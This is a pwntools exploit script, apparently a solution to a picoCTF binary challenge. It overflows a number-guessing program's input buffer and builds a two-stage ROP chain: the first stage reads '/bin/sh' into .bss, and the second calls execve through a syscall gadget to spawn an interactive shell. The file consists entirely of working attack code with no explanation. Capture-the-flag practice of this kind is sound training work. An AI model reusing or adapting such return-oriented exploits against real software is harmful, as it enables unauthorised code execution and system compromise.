


```python
from pwn import *

e = ELF("./vuln")
p = process(e.path)
#p = remote("shape-facility.picoctf.net", 51698)
read = e.symbols['read']
syscall = p64(0x000000000040138c)
randomm = [84,87]

main = p64(0x0000000000400c9c)
pop_rax = p64(0x00000000004005af)
pop_rdi = p64(0x00000000004006a6)
pop_rsi = p64(0x0000000000410b93)
pop_rdx = p64(0x0000000000410602)
bss = p64(e.bss())

payload = b'\x90'*120
payload += pop_rdi
payload += p64(0)
payload += pop_rsi
payload += bss
payload += pop_rdx
payload += p64(9)
payload += p64(read)
payload += main



p.recvline(b"What number would you like to guess?")
p.sendline(str(randomm[0]).encode())
p.recvuntil(b"Name? ")
p.sendline(payload)
p.sendline(b"/bin/sh\x00")
input("Just Enter to exploit")
p.recvline(b"What number would you like to guess?")

payload = b'\x90'*120
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += bss
payload += pop_rsi
payload += p64(0)
payload += pop_rdx
payload += p64(0)
payload += syscall


p.recvline(b"What number would you like to guess?")
p.sendline(str(randomm[1]).encode())
p.recvuntil(b"Name? ")
p.sendline(payload)
p.interactive()
```
